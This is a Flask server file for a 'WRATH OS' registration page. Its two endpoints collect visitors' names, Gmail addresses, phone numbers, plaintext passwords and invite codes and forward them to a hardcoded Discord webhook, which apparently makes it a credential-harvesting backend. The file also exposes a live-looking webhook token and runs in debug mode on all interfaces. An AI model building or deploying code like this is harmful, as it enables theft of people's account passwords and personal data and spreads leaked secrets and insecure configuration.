from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# ⚠️ PASTE YOUR ACTUAL DISCORD WEBHOOK URL HERE
# Since this is in app.py, NO ONE on the internet can see it.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1483717500704133264/6pEeutbjRjivBzxQaIelI2L42RoWJFW0jPxNNZXzbsRT_fMuTpChB2tRNJ8eDaSS0ml1"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    
    # Format the message for Discord
    payload = {
        "username": "WRATH OS MONITOR",
        "embeds": [{
            "title": "⚡ NEW OPERATOR REGISTERED ⚡",
            "color": 16711748, # Crimson Red
            "fields": [
                {"name": "👤 NAME", "value": f"`{data.get('name')}`", "inline": True},
                {"name": "📧 GMAIL", "value": f"`{data.get('email')}`", "inline": True},
                {"name": "📞 NUMBER", "value": f"`{data.get('phone')}`", "inline": False},
                {"name": "🔑 PASSWORD", "value": f"`{data.get('password')}`", "inline": True},
                {"name": "🎟️ INVITE", "value": f"`{data.get('invite')}`", "inline": True}
            ],
            "footer": {"text": "WRATH OS v5.3 • SECURE LOG"}
        }]
    }

    # Send to Discord
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/send_sms', methods=['POST'])
def send_sms():
    data = request.get_json()
    
    # Format the message for Discord
    payload = {
        "username": "WRATH OS MONITOR",
        "embeds": [{
            "title": "⚡ SMS REGISTRATION RECEIVED ⚡",
            "color": 16711748,
            "fields": [
                {"name": "👤 NAME", "value": f"`{data.get('name')}`", "inline": True},
                {"name": "📧 GMAIL", "value": f"`{data.get('gmail')}`", "inline": True},
                {"name": "📞 PHONE", "value": f"`{data.get('phone')}`", "inline": False},
                {"name": "🔑 PASSWORD", "value": f"`{data.get('password')}`", "inline": True}
            ],
            "footer": {"text": "WRATH OS v5.3 • SMS NOTIFICATION"}
        }]
    }

    # Send to Discord
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        return jsonify({"status": "success", "message_sid": "DISCORD_SENT"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)